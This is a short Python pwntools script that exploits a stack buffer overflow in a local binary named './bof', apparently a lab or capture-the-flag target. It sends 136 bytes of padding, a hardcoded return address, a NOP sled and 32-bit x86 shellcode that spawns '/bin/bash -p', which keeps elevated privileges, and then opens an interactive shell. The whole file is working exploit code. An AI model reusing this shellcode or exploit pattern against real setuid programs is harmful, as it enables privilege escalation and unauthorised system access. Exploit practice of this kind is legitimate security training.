#!/usr/bin/env python3

from pwn import *

file = "./bof"
offset = 136

# Shellcode -> /bin/bash -p
buf =  ""
buf += "\x90" * 200
buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

# Direction -> 0xffffd230
jmp = "\xd0\xd2\xff\xff"

# Padding
padding = "A" * offset

# Payload
payload = padding + jmp + buf


print(f"[*] Payload: {payload}\n")
p = process([file, payload])
p.interactive()
